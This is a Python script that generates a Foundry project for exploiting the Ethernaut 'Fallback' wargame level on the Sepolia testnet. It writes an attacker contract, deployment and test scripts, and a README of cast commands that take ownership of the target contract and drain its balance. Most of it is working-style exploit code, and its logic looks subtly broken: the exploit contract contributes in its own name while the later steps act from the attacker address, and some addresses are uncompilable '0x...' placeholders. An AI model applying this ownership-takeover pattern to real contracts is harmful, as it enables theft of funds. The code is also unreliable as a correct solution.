#!/usr/bin/env python3
"""
Ethernaut Fallback Exploit - Testnet Deployment
Target: Sepolia testnet
Contract: Fallback (Level 01)
Goal: Claim ownership and drain contract
"""

import json
import os

# Sepolia testnet configuration
SEPOLIA_RPC = "https://rpc.sepolia.org"
ETHERSCAN_API = "https://api-sepolia.etherscan.io/api"

# Contract details
FALLBACK_ADDRESS = "0x..."  # To be filled after deployment

def generate_exploit_contract():
    """Generate Solidity exploit contract"""
    contract = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IFallback {
    function contribute() external payable;
    function getContribution() external view returns (uint);
    function withdraw() external;
}

contract FallbackExploit {
    IFallback public target;
    address public owner;
    
    constructor(address _target) {
        target = IFallback(_target);
        owner = msg.sender;
    }
    
    // Step 1: Contribute small amount (< 0.001 ether)
    function contribute() external payable {
        require(msg.value < 0.001 ether, "Contribution too high");
        target.contribute{value: msg.value}();
    }
    
    // Step 2: Trigger receive() to claim ownership
    receive() external payable {
        // Ownership transferred automatically by Fallback contract
    }
    
    // Step 3: Withdraw all funds
    function exploit() external {
        require(msg.sender == owner, "Only owner");
        target.withdraw();
    }
    
    // Withdraw from this contract
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}
'''
    return contract

def generate_deployment_script():
    """Generate Foundry deployment script"""
    script = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/FallbackExploit.sol";

contract DeployExploit is Script {
    function run() external {
        // Load target address from environment
        address target = vm.envAddress("FALLBACK_TARGET");
        
        vm.startBroadcast();
        
        // Deploy exploit contract
        FallbackExploit exploit = new FallbackExploit(target);
        console.log("Exploit deployed at:", address(exploit));
        
        vm.stopBroadcast();
    }
}
'''
    return script

def generate_test_script():
    """Generate Foundry test script"""
    test = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/FallbackExploit.sol";

interface IFallback {
    function owner() external view returns (address);
    function contribute() external payable;
    function getContribution() external view returns (uint);
    function withdraw() external;
}

contract FallbackExploitTest is Test {
    FallbackExploit public exploit;
    IFallback public target;
    address public attacker = address(0x1337);
    
    function setUp() public {
        // Fork Sepolia at specific block for reproducibility
        vm.createSelectFork("https://rpc.sepolia.org");
        
        // Target address from Ethernaut
        target = IFallback(0x...); // Fill with actual instance address
        
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        exploit = new FallbackExploit(address(target));
    }
    
    function testExploit() public {
        vm.startPrank(attacker);
        
        // Step 1: Contribute small amount
        exploit.contribute{value: 0.0001 ether}();
        
        // Step 2: Send ether to trigger receive() and claim ownership
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Transfer failed");
        
        // Verify ownership
        assertEq(target.owner(), attacker);
        
        // Step 3: Withdraw all funds
        uint256 balanceBefore = attacker.balance;
        target.withdraw();
        uint256 balanceAfter = attacker.balance;
        
        // Verify profit
        assertGt(balanceAfter, balanceBefore);
        
        vm.stopPrank();
    }
}
'''
    return test

def setup_project_structure():
    """Create project structure for testnet exploit"""
    dirs = [
        "exploits/fallback",
        "exploits/fallback/src",
        "exploits/fallback/script",
        "exploits/fallback/test"
    ]
    
    for d in dirs:
        os.makedirs(d, exist_ok=True)
    
    # Write files
    with open("exploits/fallback/src/FallbackExploit.sol", "w") as f:
        f.write(generate_exploit_contract())
    
    with open("exploits/fallback/script/Deploy.s.sol", "w") as f:
        f.write(generate_deployment_script())
    
    with open("exploits/fallback/test/FallbackExploit.t.sol", "w") as f:
        f.write(generate_test_script())
    
    # Write Foundry config
    foundry_toml = '''
[profile.default]
src = "src"
out = "out"
libs = ["lib"]

[rpc_endpoints]
sepolia = "https://rpc.sepolia.org"

[etherscan]
sepolia = { key = "${ETHERSCAN_API_KEY}" }
'''
    with open("exploits/fallback/foundry.toml", "w") as f:
        f.write(foundry_toml)
    
    # Write README
    readme = '''
# Ethernaut Fallback Exploit

## Overview
Testnet deployment of Fallback (Level 01) exploit.

## Prerequisites
- Foundry installed
- Sepolia ETH (get from faucet)
- ETHERSCAN_API_KEY for verification

## Steps

1. Get Sepolia ETH from faucet:
   - https://sepoliafaucet.com/
   - https://faucet.quicknode.com/ethereum/sepolia

2. Set environment variables:
   ```bash
   export PRIVATE_KEY=your_private_key
   export FALLBACK_TARGET=0x... # Your Ethernaut instance
   export ETHERSCAN_API_KEY=your_key
   ```

3. Deploy exploit contract:
   ```bash
   forge script script/Deploy.s.sol --rpc-url sepolia --broadcast --verify
   ```

4. Execute exploit:
   ```bash
   cast send <EXPLOIT_ADDRESS> "contribute()" --value 0.0001ether --rpc-url sepolia
   cast send <FALLBACK_TARGET> "" --value 0.0001ether --rpc-url sepolia
   cast send <FALLBACK_TARGET> "withdraw()" --rpc-url sepolia
   ```

5. Verify on Etherscan

## Security Notes
- Only run on testnet
- Never commit private keys
- Use burner wallet
'''
    with open("exploits/fallback/README.md", "w") as f:
        f.write(readme)
    
    print("âœ… Fallback exploit project created in exploits/fallback/")
    print("\nNext steps:")
    print("1. Get Sepolia ETH from faucet")
    print("2. Set PRIVATE_KEY environment variable")
    print("3. Run: cd exploits/fallback && forge build")

if __name__ == "__main__":
    setup_project_structure()
